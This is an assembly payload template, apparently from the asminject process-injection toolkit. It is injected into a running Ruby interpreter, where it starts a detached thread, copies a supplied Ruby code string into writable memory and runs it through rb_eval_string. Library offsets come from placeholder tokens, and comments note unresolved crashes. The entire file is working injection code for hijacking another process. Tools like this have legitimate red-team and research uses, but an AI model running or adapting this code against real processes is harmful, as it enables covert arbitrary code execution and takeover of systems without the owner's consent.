// an attempt to work around Ruby locking up when code is injected
// does not currently work any better than the unthreaded version

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
[FRAGMENT:asminject_nanosleep.s:FRAGMENT]

	# // BEGIN: call ruby_sysinit
	# push rbx
	# lea rax, ruby_argv[rip]	# fake argv data
	# lea rdx, ruby_argc[rip]	# fake argc data
	# mov rsi, rdx
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_sysinit:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_sysinit
	
	# // BEGIN: call ruby_init_stack
	# push rbx
	# lea rax, [RBP - 8]
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init_stack:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_init_stack
	
	# // BEGIN: call ruby_init
	# push rbx
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_init
	
	# // BEGIN: call ruby_init_loadpath
	# push rbx
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init_loadpath:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_init_loadpath
	
	// copy the Ruby string to arbitrary read/write memory
	push r14
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	lea rsi, ruby_code[rip]
	mov rcx, [VARIABLE:rubycode.length:VARIABLE]
	add rcx, 2												# null terminator
	call asminject_copy_bytes
	pop r14
	// END: copy the Ruby string to arbitrary read/write memory
	
	// BEGIN: call rb_eval_string
	push r14
	push rbx
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_eval_string:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r14
	// END: call rb_eval_string
	
	# // BEGIN: call ruby_cleanup
	# push rbx
	# mov rdi, 0
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_cleanup:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_cleanup
	
	#mov rax, 0
	#mov rdi, 0
	#call asminject_libpthread_pthread_exit
	# calling pthread_exit here will cause Ruby to crash with a stack trace
	ret
	
forever_loop:
	mov rdi, 10
	mov rsi, 10
	call asminject_nanosleep
	jmp forever_loop

execute_ruby_code_main:
	lea rdx, execute_ruby_code_inner[rip]
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x1000		# don't overwrite anything important
	push rdx
	push rdi
	call asminject_libpthread_pthread_create
	pop rdi
	pop rdx
// detach the newly-created thread where the library has been loaded
	call asminject_libpthread_pthread_detach

SHELLCODE_SECTION_DELIMITER

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"

#ruby_argv:
#	.ascii "\0"
	
#ruby_argc:
#	.byte 1

